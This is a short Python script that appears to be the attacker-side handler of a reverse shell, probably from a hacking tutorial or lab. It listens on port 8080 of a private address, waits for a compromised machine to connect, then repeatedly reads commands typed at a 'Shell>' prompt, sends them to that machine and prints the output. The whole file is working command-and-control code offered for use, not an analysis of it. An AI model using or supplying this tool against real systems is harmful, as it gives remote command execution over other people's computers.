import socket

def connect():
    Mysocket = socket.socket()
    Mysocket.bind(("192.168.229.131", 8080))
    Mysocket.listen(1)
    connection, addres = Mysocket.accept()
    print("Connection established sucessfully", addres)

    while True:
        command = input("Shell> : ")
        if "terminate" in command:
            connection.send("terminate".encode())
            connection.close()
            break
        else:
            connection.send(command.encode())
            print(connection.recv(1024).decode())

def main():
    connect()

main()